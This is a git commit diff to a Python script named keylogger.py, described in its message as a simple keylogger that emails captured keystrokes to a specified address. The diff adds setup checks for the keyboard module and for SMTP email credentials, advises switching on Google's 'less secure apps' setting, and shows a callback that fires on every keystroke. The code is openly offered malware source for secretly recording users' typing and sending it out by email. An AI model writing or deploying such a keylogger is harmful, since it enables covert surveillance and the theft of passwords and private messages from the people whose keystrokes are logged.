2c134492981cd8e4a88b8902ae54ff7a2ddbe09b
harisaifi <harissaifi53@gmail.com>
2020-04-14 17:01:54 +0530

    Simple Keylogger Script to send Keystrokes logs to specified email...

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,22 @@
-# for key logs
-import keyboard
-
 # for sending mails
 import smtplib
+import sys
+
+try:
+    # get full control of keyboard
+    import keyboard
+except ModuleNotFoundError:
+    print("Error : Cannot import keyboard!")
+    print("If not installed :\n(run this command)\npip install keyboard")
+    sys.exit(1)
+
 
 # Semaphore to block and unblock the thread
 # Timer to run a method after a particular interval of time
 from threading import Semaphore, Timer
 
 
+# before running the script set "ACCESS TO LESS SECURE APPS" to YES in google account
 # 60 seconds
 TIME_INTERVAL = 60
 # enter you email inside "HERE"
@@ -16,7 +24,10 @@ EMAIL = ""
 # and you email's password inside "HERE"
 PASSWORD = ""
 
-# before running the script set "ACCESS TO LESS SECURE APPS" on
+if len(EMAIL) <= 0 or len(PASSWORD) <= 0:
+    print("Enter email and password first...")
+    sys.exit(1)
+
 
 class Keylogger:
     def __init__(self, interval):
@@ -28,7 +39,7 @@ class Keylogger:
         self.semaphore = Semaphore(0)
 
     def callback(self,event):
-        # this method os called on every keystroke
+        # this method is called on every keystroke
         name = event.name
         if len(name) > 1:
             if name == "space":
